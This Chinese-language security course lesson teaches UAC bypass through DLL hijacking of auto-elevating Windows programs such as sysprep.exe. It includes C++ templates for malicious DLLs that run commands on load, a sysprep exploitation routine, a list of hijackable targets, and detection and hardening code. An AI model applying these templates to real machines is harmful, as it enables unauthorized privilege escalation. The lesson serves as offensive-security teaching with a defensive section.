# 课时18：白名单DLL劫持绕UAC

## 1. 课程目标

学习利用DLL劫持技术绕过UAC，通过劫持自动提权程序加载的DLL来实现权限提升。

### 1.1 学习目标

- 理解DLL劫持原理
- 掌握DLL搜索顺序
- 学会查找可劫持的DLL
- 实现DLL劫持绕过UAC

---

## 2. 名词解释

| 名词 | 英文 | 解释 |
|------|------|------|
| **DLL劫持** | DLL Hijacking | 将恶意DLL放置在程序搜索路径中 |
| **DLL侧加载** | DLL Side-Loading | 利用合法程序加载恶意DLL |
| **搜索顺序** | Search Order | 程序查找DLL的目录顺序 |
| **KnownDLLs** | - | 受保护的系统DLL列表 |
| **SafeDllSearchMode** | - | 安全DLL搜索模式 |

---

## 3. DLL搜索顺序

### 3.1 默认搜索顺序

```
启用SafeDllSearchMode（默认）:
1. 应用程序目录
2. System32目录 (C:\Windows\System32)
3. System目录 (C:\Windows\System)
4. Windows目录 (C:\Windows)
5. 当前工作目录
6. PATH环境变量中的目录

禁用SafeDllSearchMode:
1. 应用程序目录
2. 当前工作目录
3. System32目录
4. System目录
5. Windows目录
6. PATH环境变量
```

### 3.2 KnownDLLs保护

```
注册表位置: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

受保护的DLL不会被劫持:
- kernel32.dll
- ntdll.dll
- user32.dll
- ... 等核心系统DLL
```

---

## 4. 寻找可劫持的DLL

### 4.1 使用Process Monitor

```
1. 运行Process Monitor (procmon.exe)
2. 设置过滤器:
   - Process Name: 目标程序名
   - Result: NAME NOT FOUND
   - Path: ends with .dll
3. 运行目标程序
4. 观察哪些DLL加载失败
```

### 4.2 自动化扫描工具

```cpp
#include <windows.h>
#include <stdio.h>

// 检查DLL是否在KnownDLLs中
BOOL IsKnownDLL(LPCWSTR szDllName) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs",
                      0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    
    WCHAR szValue[256];
    DWORD dwSize = sizeof(szValue);
    DWORD dwIndex = 0;
    
    while (RegEnumValueW(hKey, dwIndex++, szValue, &dwSize, 
                         NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        if (_wcsicmp(szValue, szDllName) == 0 || 
            wcsstr(szDllName, szValue)) {
            RegCloseKey(hKey);
            return TRUE;
        }
        dwSize = sizeof(szValue);
    }
    
    RegCloseKey(hKey);
    return FALSE;
}

// 检查指定目录下的DLL是否可以被劫持
void ScanForHijackableDLLs(LPCWSTR szExePath) {
    printf("[*] 扫描可劫持DLL: %ws\n", szExePath);
    
    // 使用API Monitor或手动分析导入表
    // 检查每个导入的DLL是否:
    // 1. 不在KnownDLLs中
    // 2. 不在System32中（或可以被更高优先级路径劫持）
}
```

---

## 5. 常见的可劫持目标

### 5.1 自动提权程序的DLL劫持

| 程序 | 可劫持DLL | 说明 |
|------|-----------|------|
| sysprep.exe | cryptsp.dll | 系统准备工具 |
| cliconfg.exe | ntwdblib.dll | SQL客户端配置 |
| mmc.exe | elsext.dll | 管理控制台 |
| dxcap.exe | various | DirectX工具 |

### 5.2 sysprep.exe劫持示例

```cpp
// DLL代码 - 编译为cryptsp.dll或cryptbase.dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // 禁用线程通知
        DisableThreadLibraryCalls(hinstDLL);
        
        // 执行payload
        WinExec("cmd.exe", SW_SHOW);
        
        // 或者更隐蔽的方式
        // CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}

// 导出原DLL的函数（保持兼容性）
// 使用pragma comment或DEF文件转发到原DLL
```

---

## 6. 完整利用流程

### 6.1 步骤概述

```
1. 找到一个自动提权的程序（白名单程序）
2. 分析其加载的DLL，找到可劫持的DLL
3. 创建恶意DLL（同名）
4. 将恶意DLL放到程序目录或搜索路径的高优先级位置
5. 运行目标程序，触发DLL加载
6. 恶意代码以提升权限执行
```

### 6.2 sysprep利用实现

```cpp
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

// 利用sysprep.exe DLL劫持绕过UAC
BOOL ExploitSysprepDLLHijack() {
    printf("[*] sysprep.exe DLL劫持利用\n");
    
    // 1. sysprep目录路径
    WCHAR szSysprepDir[MAX_PATH];
    ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\Sysprep", 
                              szSysprepDir, MAX_PATH);
    
    // 2. 检查是否有写权限（通常需要管理员）
    // 这里假设我们通过其他方式获得了写权限
    
    // 3. 复制恶意DLL
    WCHAR szDllPath[MAX_PATH];
    wsprintfW(szDllPath, L"%s\\cryptbase.dll", szSysprepDir);
    
    // CopyFileW(L"evil.dll", szDllPath, FALSE);
    printf("[+] DLL路径: %ws\n", szDllPath);
    
    // 4. 运行sysprep.exe
    WCHAR szSysprep[MAX_PATH];
    wsprintfW(szSysprep, L"%s\\sysprep.exe", szSysprepDir);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = szSysprep;
    sei.lpParameters = L"/quiet";
    sei.nShow = SW_HIDE;
    
    // ShellExecuteExW(&sei);
    printf("[*] 运行: %ws\n", szSysprep);
    
    return TRUE;
}
```

### 6.3 恶意DLL模板

```cpp
// evil_dll.cpp - 编译为目标DLL名称
#include <windows.h>

#pragma comment(linker, "/export:SomeExportedFunction=original.SomeExportedFunction")

void Payload() {
    // 创建反向shell或执行命令
    WinExec("cmd.exe /c whoami > C:\\proof.txt", SW_HIDE);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
        break;
    }
    return TRUE;
}
```

---

## 7. 使用WinSxS绕过

### 7.1 WinSxS机制

Windows Side-by-Side可以指定特定版本的DLL加载。

```cpp
// 通过manifest指定DLL加载
// 创建一个.manifest文件与程序同名

// 例如: program.exe.manifest
/*
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <dependency>
    <dependentAssembly>
      <assemblyIdentity type="win32" name="Microsoft.Windows.Common-Controls" 
                        version="6.0.0.0" processorArchitecture="*" 
                        publicKeyToken="6595b64144ccf1df" language="*"/>
    </dependentAssembly>
  </dependency>
</assembly>
*/
```

---

## 8. 检测与防御

### 8.1 检测方法

| 方法 | 说明 |
|------|------|
| 签名验证 | 检查加载的DLL是否有有效签名 |
| 路径监控 | 监控可写目录中的DLL创建 |
| 行为分析 | 检测异常的DLL加载模式 |
| 完整性检查 | 验证系统目录的完整性 |

### 8.2 防御措施

```cpp
// 编程时的防御措施

// 1. 使用绝对路径加载DLL
LoadLibraryW(L"C:\\Windows\\System32\\target.dll");

// 2. 验证DLL签名
BOOL VerifyDLLSignature(LPCWSTR szDllPath) {
    WINTRUST_FILE_INFO fileInfo = { sizeof(fileInfo) };
    fileInfo.pcwszFilePath = szDllPath;
    
    WINTRUST_DATA trustData = { sizeof(trustData) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    
    GUID policyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    
    LONG status = WinVerifyTrust(NULL, &policyGUID, &trustData);
    return (status == ERROR_SUCCESS);
}

// 3. 使用SetDefaultDllDirectories
SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32);
```

---

## 9. 课后作业

### 作业1：DLL劫持检测（必做）

1. 使用Process Monitor找出3个可劫持的DLL
2. 记录目标程序和DLL名称

### 作业2：简单DLL劫持（必做）

1. 创建一个简单的恶意DLL（弹MessageBox）
2. 找一个普通程序进行劫持测试

### 作业3：UAC绕过（进阶）

1. 对白名单程序进行DLL劫持分析
2. 尝试实现提权（仅在授权环境中）

---

## 10. 下一课预告

下一课我们将学习PPL（Protected Process Light）保护机制。
